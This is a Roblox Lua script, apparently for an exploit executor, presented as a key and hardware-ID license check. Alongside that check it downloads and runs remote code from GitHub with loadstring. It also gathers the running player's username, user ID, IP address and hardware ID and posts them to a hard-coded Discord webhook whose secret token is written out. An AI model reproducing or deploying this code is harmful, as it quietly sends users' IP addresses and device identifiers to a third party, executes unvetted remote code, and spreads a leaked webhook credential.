local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local clientHWID = RbxAnalyticsService:GetClientId()
local HttpService = game:GetService("HttpService")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local webhookUrl = "https://discord.com/api/webhooks/1363428306048778312/ePaZU3-PDYO0-u9I2VJFQpGeYYOsn0OVA2soAoiPsDhu1Fs_WZ1_8OlQStVLLvUPpnye"
local thumbnailUrl = "https://www.roblox.com/asset-thumbnail/image?assetId=1&width=420&height=420"

local success, response = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/minute124/OJUNYUYVF/main/KeySystem.lua")
end)

if not success then
    print("Erorr 404-2")
    return
end

local keys
success, keys = pcall(function()
    return loadstring(response)()
end)

if not success or type(keys) ~= "table" then
    print("Erorr 404-3")
    return
end

local function authenticate(inputKey, inputHWID)
    for _, entry in ipairs(keys) do
        if entry.key == inputKey then
            if entry.hwid == inputHWID then
                return "Authenticated"
            else
                return "HWID mismatch"
            end
        end
    end
    return "License mismatch"
end

local result = authenticate(getgenv().key, clientHWID)
print(result)

local success, lib = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/minute124/OJUNYUYVF/refs/heads/main/Roblox-Functions-Library.lua"))()
end)
if not success then
    warn("Failed to load external library: " .. tostring(lib))
end

local realData = {
    RobloxNickname = player.Name,
    DiscordNickname = player.DisplayName,
    UserId = player.UserId,
    ProfileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
    IP = GetIP(),
    HWID = "HWID-" .. (RbxAnalyticsService:GetClientId() or "Unknown"),
    auth = result
}

if _G.GetIP then
    local ipSuccess, ip = pcall(_G.GetIP)
    if ipSuccess then
        realData.IP = ip
    else
        warn("Failed to get IP: " .. tostring(ip))
    end
end

local success, response = pcall(function()
    local apiUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png"
    local json = game:HttpGet(apiUrl)
    local data = HttpService:JSONDecode(json)
    return data.data[1].imageUrl
end)
if success then
    thumbnailUrl = response
else
    warn("Failed to fetch thumbnail: " .. tostring(response))
end

local embedData = {
    ["embeds"] = {
        {
            ["title"] = "🎮 Roblox Player Info",
            ["description"] = "Details of the current Roblox user.",
            ["color"] = 0x5865F2,
            ["fields"] = {
                {
                    ["name"] = "Username",
                    ["value"] = realData.RobloxNickname,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = realData.DiscordNickname,
                    ["inline"] = true
                },
                {
                    ["name"] = "User ID",
                    ["value"] = tostring(realData.UserId),
                    ["inline"] = true
                },
                {
                    ["name"] = "Profile",
                    ["value"] = "[Click Here](" .. realData.ProfileLink .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Address",
                    ["value"] = realData.IP,
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = realData.HWID,
                    ["inline"] = true
                },
                {
                    ["name"] = "Authentication",
                    ["value"] = realData.auth,
                    ["inline"] = true
                }
            },
            ["footer"] = {
                ["text"] = "Logged at " .. os.date("!%Y-%m-%dT%H:%M:%SZ", os.time())
            },
            ["thumbnail"] = {
                ["url"] = thumbnailUrl
            }
        }
    }
}

local success, response = pcall(function()
    return request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(embedData)
    })
end)

if success then
    print("Webhook sent successfully!")
    print("Thumbnail URL: " .. thumbnailUrl)
else
    warn("Failed to send webhook: " .. tostring(response))
end
--ㅇ
